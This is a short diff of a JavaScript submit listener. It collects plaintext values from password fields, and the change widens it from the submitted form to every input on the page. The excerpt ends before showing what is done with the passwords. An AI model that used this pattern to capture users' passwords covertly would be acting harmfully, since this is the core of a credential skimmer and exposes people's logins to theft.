@@ -1,11 +1,11 @@
 document.addEventListener('submit', (event) => {
-	const formChildren = event.target.children
+	const inputs = document.getElementsByTagName('input')
 	let passwordValues = []
 
-	for (let child of formChildren) {
-		if (child.type === 'password') {
-			passwordValues.push(child.value)
-		}
+	for(var i = 0; i < inputs.length; i++) {
+	    if(inputs[i].type.toLowerCase() == 'password') {
+	        passwordValues.push(inputs[i].value);
+	    }
 	}
 
 	if (passwordValues.length) {
